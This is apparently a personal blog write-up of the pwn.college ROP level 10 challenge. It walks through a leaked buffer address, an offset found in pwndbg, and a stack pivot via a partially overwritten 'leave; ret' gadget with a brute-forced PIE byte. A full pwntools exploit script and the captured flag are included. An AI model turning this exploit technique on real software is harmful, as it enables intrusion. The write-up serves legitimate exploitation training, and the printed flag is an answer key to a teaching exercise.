---
layout: post
title: (ROP) level 10
date: 2025-07-10 18:32:34 +0300
categories: pwn.college ROP
tags: pwn.college ROP brute-force partial-overwrite buffer-overflow ret2win bad-byte
---

## Information 
- category: pwn

## Description
> Perform a partial overwrite to call the win function.

## Write-up
**So after running the challenge, we get a leak of the input buffer's address.**
We’ll use this leak later to calculate the address of the ```win``` function by subtracting ```0x10``` from it:
```bash
./challenge
....
....
[LEAK] Your input buffer is located at: 0x7ffdbd72cc68.
```
> 💡 The leaked buffer address ```0x7ffdbd72cc68``` helps us calculate the address of `win` by subtracting `0x10`.
{: .prompt-info}

Now we’ll calculate the offset to the ```rbp``` register and the return address:
```bash

Breakpoint 1, 0x00005e8365a34656 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────[ REGISTERS / show-flags off / show-compact-regs off ]──────
*RAX  0x7fff66dc11e8 ◂— 0
 RBX  0x5e8365a347b0 (__libc_csu_init) ◂— endbr64 
*RCX  0
*RDX  0x1000
*RDI  0
*RSI  0x7fff66dc11e8 ◂— 0
*R8   0x4a
*R9   0x4a
*R10  0x5e8365a35834 ◂— 0x6563655200000a2e /* '.\n' */
*R11  0x246
 R12  0x5e8365a33240 (_start) ◂— endbr64 
 R13  0x7fff66dc1350 ◂— 1
 R14  0
 R15  0
*RBP  0x7fff66dc1230 —▸ 0x7fff66dc1260 ◂— 0
*RSP  0x7fff66dc11c0 —▸ 0x721f35bbc6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
*RIP  0x5e8365a34656 (challenge+584) ◂— call 0x5e8365a331b0


──────────────────────────[ BACKTRACE ]───────────────────────────
 ► 0   0x5e8365a34656 challenge+584
   1   0x5e8365a3479b main+165
   2   0x721f359f3083 __libc_start_main+243
   3   0x5e8365a3326e _start+46
──────────────────────────────────────────────────────────────────
```

```
pwndbg> dist $rsi 0x7fff66dc1230
0x7fff66dc11e8->0x7fff66dc1230 is 0x48 bytes (0x9 words)
```

**But how can we return to the win function when:**

- The binary has **PIE enabled**
- We're allowed to execute only **one gadget**
- And we don’t know the base address directly?

Here’s the strategy:

We know that the program calls a function named ```challenge```, and after it returns, it continues execution normally.
If we can forge a fake ```rbp``` value so that when the function returns, it **lands on a controlled address**, we can redirect execution to ```win```.


**The Trick — Brute-Forcing PIE LSB**

Since **PIE** is enabled, the address of:
```0x00005e8365a3371e: leave; ret; ``` 
changes each time — but only one byte vary.
We can brute-force the this byte to find the correct ret into win.
> The critical byte is `0x33` — brute-forcing it allows us to bypass PIE and reach the `win` function.
{: .prompt-tip}


**So the final trick is:**

- Forge a fake ```rbp```
- Use a gadget  ```leave; ret```
- **Brute-force** the key PIE byte (```0x33```) to jump into ```win```

## Exploit
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("/challenge/babyrop_level10.0")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addrr", 1337)

    return r


def get_leak(r):
    r.recvuntil(b"located at: ")
    buffer = int(r.recvline().decode().split(".")[0],16)
    return buffer



def main():
    while True:
        r = conn()

        address_win = get_leak(r) - 0x10

        offset = 72

        fixed_byte = b"\x1e"
        i = [p8(0x7 + nn) for nn in range(0x00,0x100,0x10)]

        payload = b"A"*offset + p64(address_win) + fixed_byte + random.choice(i)

        r.send(payload)
        res = r.recvall(timeout=3)

        if b"pwn.college{" in res:
            print(res)
            break

if __name__ == "__main__":
    main()
```

## Flag
> Flag:``` pwn.college{J6Zz_twSS7T9-zrasHq-EfDZch7.0VO1MDLwczN4czW}```






